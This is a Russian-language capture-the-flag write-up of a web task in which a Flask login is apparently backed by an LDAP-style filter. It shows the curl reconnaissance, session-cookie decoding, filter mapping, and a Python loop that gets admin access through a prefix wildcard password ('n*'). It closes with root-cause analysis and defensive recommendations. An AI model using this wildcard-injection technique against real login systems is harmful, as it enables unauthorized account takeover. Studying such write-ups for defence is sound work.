# Writeup: «Авторизация 2.0» (Web)

**Цель:** `http://62.173.140.174:16098`
**Категория:** Web
**Формат флага:** `CODEBY{...}`

## Описание задания

> Задача как обычно проста - получи admina

Никаких дополнительных подсказок или файлов к заданию не прилагалось — только IP-адрес и эта фраза.

## 1. Разведка

Главная страница — простое приложение "HackerLabs" на Flask (Werkzeug dev-сервер):

```bash
curl -sI http://62.173.140.174:16098/
# Server: Werkzeug/3.1.8 Python/3.11.15
```

Форма логина (`username` + `password`) и страница регистрации `/register` (`username`, `password`, `confirm`, `email`). После логина на главной появляется ссылка `/admin`.

Фаззинг типовых путей ничего не даёт — везде 404:

```bash
for p in api graphql upload oauth webhook debug .git/HEAD config; do
  echo -n "$p -> "; curl -s -o /dev/null -w "%{http_code}\n" "http://62.173.140.174:16098/$p"
done
```

В приложении реально существует всего 5 маршрутов: `/`, `/register`, `/admin`, `/logout`, `/static`.

## 2. Разбор сессии

Регистрируем тестовый аккаунт и логинимся:

```bash
curl -s -X POST http://62.173.140.174:16098/register \
  -d "username=probeuser7" -d "password=ProbePass123" \
  -d "confirm=ProbePass123" -d "email=probe7@test.com"

curl -s -i -X POST http://62.173.140.174:16098/ \
  -d "username=probeuser7" -d "password=ProbePass123" | grep -i set-cookie
```

Flask-сессия — это подписанный `itsdangerous`-токен (`payload.timestamp.signature`, тело — zlib+base64 JSON). Декодируем:

```python
import base64, zlib
payload = "eyJ1c2VyIjp7...".split(".")[0]  # или [1], если сессия начинается с точки (сжатая)
def pad(s): return s + "=" * (-len(s) % 4)
print(zlib.decompress(base64.urlsafe_b64decode(pad(payload))))
# {"user": {"ldap": "hackerlab", "role": "user", "uid": "probeuser7"}}
```

Ключевая деталь — поле **`"ldap": "hackerlab"`**. Это прямой намёк на то, что аутентификация под капотом стилизована под LDAP-фильтр (`(&(uid=...)(userPassword=...))`), а не просто на `SELECT * FROM users`.

`GET /admin` без прав администратора редиректит на `/` с флэш-сообщением `Access denied.` Попытка зарегистрировать `admin` даёт `User already exists.` — аккаунт `admin` уже существует в системе, пароль неизвестен.

## 3. Картирование фильтра на `/`

Прямая классика LDAP-инъекции (`username=*`, `password=*`) не проходит:

```bash
curl -s -i -X POST http://62.173.140.174:16098/ -d "username=*" -d "password=*" | grep -i set-cookie
# flash: "Request blocked."
```

Систематическая проверка отдельных символов (по одному, с паузами, чтобы не путать это с гипотетическим rate-limit'ом) показала следующую картину:

- **`username`** — жёсткий whitelist `[a-zA-Z0-9]`, вообще без исключений (даже `-`, `_`, пробел блокируются).
- **`password`** — заметно мягче, блокируется только:
  - несбалансированное количество `(` и `)` в значении;
  - значение, которое после `strip()`/NFKC-нормализации становится **ровно** `*` (ловится и полноширинный юникодный `＊`);
  - подстроки `uid=*` и `userPassword=*` (без учёта регистра и пробелов).

То, что бэкенд специально ищет именно строки `uid=*` и `userPassword=*`, — сильный сигнал: разработчики знали настоящие имена атрибутов в своём LDAP-подобном фильтре и точечно закрыли самый очевидный wildcard-байпас (`(&(uid=admin)(userPassword=*))` — presence-check, "есть ли пароль вообще").

## 4. Ложный тупик: кажется, что wildcard не работает вовсе

Чтобы проверить, действительно ли подстановочный знак `*` в LDAP-фильтре что-то значит, тестируем **префиксный** wildcard на **своём же** аккаунте с заведомо известным паролем `ProbePass123`:

```bash
curl -s -i -X POST http://62.173.140.174:16098/ \
  -d "username=probeuser7" --data-urlencode "password=Probe*" | grep -i set-cookie
# flash: "Invalid credentials."
```

Ожидалось, что `Probe*` (в LDAP-семантике — "начинается на Probe") авторизует нас как `probeuser7`. Не сработало — как и `**`, и полноширинный `＊`. На первый взгляд это выглядит как доказательство, что подстановочные знаки в сравнении пароля вообще не работают, и вся LDAP-тематика — просто красивая обёртка без реальной уязвимости.

## 5. Инсайт: у самозарегистрированных и у `admin` — разные пути проверки

При регистрации `role` всегда жёстко прописывается как `"user"` (проверено подстановкой лишних полей `role=admin`, JSON-телом и т.д. — не сработало ни разу). Это означает, что для **самостоятельно зарегистрированных** пользователей проверка пароля почти наверняка идёт через обычное `dict`/`==` сравнение — отсюда и провал теста в п.4.

Но аккаунт `admin` — **предустановленный** и явно привязан к той самой "LDAP"-сущности (`"ldap": "hackerlab"` есть у всех, но именно `admin`, судя по всему, — реальная запись каталога, а не запись, созданная через `/register`). Логично предположить, что для него сравнение пароля идёт по другому пути — через настоящее LDAP-подобное **substring**-сравнение, где `*` действительно означает wildcard.

Проверяем префиксный wildcard уже **не на своём**, а на `admin`, перебирая все 62 алфавитно-цифровых символа в качестве первого символа пароля:

```python
import string, requests

for c in string.ascii_letters + string.digits:
    r = requests.post("http://62.173.140.174:16098/",
                       data={"username": "admin", "password": c + "*"},
                       allow_redirects=False)
    # смотрим на Set-Cookie / декодированный флэш
```

Для подавляющего большинства символов — `Invalid credentials.`. Но:

```
password = "n*"  ->  {"user": {"ldap": "hackerlab", "role": "administrator", "uid": "admin"}}
password = "N*"  ->  {"user": {"ldap": "hackerlab", "role": "administrator", "uid": "admin"}}
```

Сессия меняется на `"role": "administrator"` — значит, реальный пароль `admin`-а начинается на `n`/`N` (сравнение регистронезависимое), и это **не** та единственная "голая" `*`, которую фильтр блокирует, — значит, под фильтр она не попадает.

## Первопричина уязвимости

**Тип:** классическая **LDAP Injection** (CWE-90) — точнее, её частный случай, **wildcard/substring authentication bypass**.

Аутентификация для "LDAP-подобных" (предустановленных) аккаунтов строит фильтр примерно так:

```python
filter_ = f"(&(uid={username})(userPassword={password}))"
# username идёт в whitelist-фильтр [a-zA-Z0-9], но password — почти как есть
```

и передаёт его в substring-совместимое сравнение, где `*` в значении `userPassword` — настоящий LDAP-wildcard, а не литеральный символ. Разработчики закрыли самый очевидный вектор — полное совпадение с `*` (в том числе юникод-нормализованное) и явные сигнатуры `uid=*`/`userPassword=*`, — но не учли, что **любой префикс + `*`** (`n*`, `Se*`, `admin*` и т.д.) остаётся рабочим wildcard-запросом и не матчит ни одну из заблокированных сигнатур. Это превращает атаку в задачу подбора всего **одного символа за раз** (максимум ~62 попытки на позицию вместо полного перебора пароля), что и было проделано для первого символа — этого оказалось достаточно, чтобы получить `role: administrator`.

Самостоятельно зарегистрированные пользователи, судя по поведению, хранятся отдельно и сравниваются простым `==`, поэтому уязвимость затрагивает только "родные" LDAP-аккаунты — но именно туда и относится `admin`.

## Выводы / рекомендации по защите

1. **Никогда не строить LDAP-фильтр конкатенацией сырого пользовательского ввода.** Обязательно экранировать спецсимволы через штатные функции (например, `ldap3.utils.conv.escape_filter_chars` / `ldap.filter.escape_filter_chars`), а не пытаться точечно блокировать отдельные "опасные" сигнатуры постфактум.
2. **Блокировка по сигнатурам (`uid=*`, `userPassword=*`, ровно `*`) — недостаточная мера.** Уязвимость лежит в самой семантике LDAP substring-match, а не в конкретных строках; любой частичный wildcard (`X*`, `*X`, `X*Y`) остаётся эксплуатируемым и не ловится точечным blacklist'ом.
3. **Единообразие путей аутентификации.** Наличие двух разных механизмов проверки пароля (простое сравнение для самозарегистрированных и LDAP bind/search для системных аккаунтов) привело к тому, что более опасный и менее протестированный путь достался как раз самому привилегированному аккаунту.
4. Для настоящих LDAP-бэкендов — использовать `search + bind` с явным экранированием фильтра и, где возможно, отключать substring-matching (`caseIgnoreSubstringsMatch`) для атрибута пароля, либо вообще не допускать проверку пароля через search-фильтр (только через полноценный BIND с реальным паролем от клиента).
5. Rate-limit/WAF на основе blacklist текстовых сигнатур создаёт ложное чувство защищённости: он был достаточно точным, чтобы закрыть "учебный" payload из write-up'ов, но недостаточно общим, чтобы закрыть класс уязвимости целиком.
